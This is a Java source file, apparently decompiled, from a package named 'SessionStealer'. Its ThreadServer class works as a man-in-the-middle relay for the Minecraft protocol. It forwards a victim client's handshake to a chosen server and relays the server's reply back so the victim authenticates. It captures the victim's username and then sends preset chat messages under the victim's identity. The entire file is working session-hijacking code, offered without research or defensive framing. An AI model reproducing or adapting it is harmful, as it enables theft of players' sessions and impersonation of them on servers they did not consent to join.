package me.Scetch.SessionStealer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import me.Scetch.SessionStealer.SessionStealer;

public class ThreadServer
extends Thread {
    private String handshakeResponse;
    private boolean connectedToServer;

    public ThreadServer(String s) {
        this.handshakeResponse = s;
    }

    @Override
    public void run() {
        try {
            block7: {
                SessionStealer.log("Recieved Client Handshake [" + this.handshakeResponse + "]");
                SessionStealer.socketOut = new Socket(SessionStealer.targetServer, SessionStealer.targetPort);
                SessionStealer.DIOut = new DataInputStream(SessionStealer.socketOut.getInputStream());
                SessionStealer.DOOut = new DataOutputStream(SessionStealer.socketOut.getOutputStream());
                SessionStealer.log("Forwarding Handshake [" + SessionStealer.targetServer + ":" + SessionStealer.targetPort + "]");
                SessionStealer.DOOut.write(2);
                SessionStealer.writeString(this.handshakeResponse, SessionStealer.DOOut);
                while (true) {
                    int i;
                    if ((i = SessionStealer.DIOut.read()) == -1) {
                        SessionStealer.log("End of Stream [Server]");
                        break block7;
                    }
                    if (this.connectedToServer) continue;
                    if (i == 1) {
                        SessionStealer.log("Messages [" + SessionStealer.messages.length + "]");
                        int j = 0;
                        while (j < SessionStealer.messages.length) {
                            this.sendChatMessage(SessionStealer.messages[j]);
                            ++j;
                        }
                        SessionStealer.closeConnection = true;
                        this.connectedToServer = true;
                        break block7;
                    }
                    if (i == 2) {
                        String s1 = SessionStealer.readString(SessionStealer.DIOut);
                        SessionStealer.minecraftUsername = this.handshakeResponse.substring(0, this.handshakeResponse.indexOf(";"));
                        SessionStealer.log("Relaying Handshake [" + s1 + "]");
                        SessionStealer.DOIn.write(2);
                        SessionStealer.writeString(s1, SessionStealer.DOIn);
                        continue;
                    }
                    if (i == 255) break;
                }
                SessionStealer.log("Kick [" + SessionStealer.readString(SessionStealer.DIOut) + "]");
                SessionStealer.closeConnection = true;
            }
            SessionStealer.log("Closing [" + SessionStealer.targetServer + ":" + SessionStealer.targetPort + "]");
            this.connectedToServer = false;
            SessionStealer.DOOut.close();
            SessionStealer.DIOut.close();
            SessionStealer.socketOut.close();
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void sendChatMessage(String s) throws Exception {
        SessionStealer.DOOut.write(3);
        SessionStealer.writeString(s, SessionStealer.DOOut);
    }
}
